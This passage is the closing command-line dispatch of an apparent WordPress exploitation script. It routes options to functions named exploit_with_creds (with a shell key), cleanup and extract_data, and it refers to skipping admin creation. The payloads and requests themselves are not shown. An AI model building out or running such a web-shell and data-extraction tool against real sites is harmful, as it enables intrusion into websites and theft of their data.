            skip_outfile=args.skip_outfile,
            skip_create_admin=args.no_create_admin,
        )
        sys.exit(0 if ok else 1)

    elif args.shell:
        if not args.admin_user or not args.admin_pass:
            parser.error("--shell requires --admin-user and --admin-pass")
        ok = wp.exploit_with_creds(
            args.admin_user, args.admin_pass, args.shell_key)
        sys.exit(0 if ok else 1)

    elif args.cleanup:
        ok = wp.cleanup(
            args.admin_user, args.admin_pass, args.shell_key)
        sys.exit(0 if ok else 1)

    elif args.extract:
        result = wp.extract_data(args.extract)
        if result:
            print()
            log(f"Result: {result}", "+")
            sys.exit(0)
        sys.exit(1)


if __name__ == "__main__":
    main()
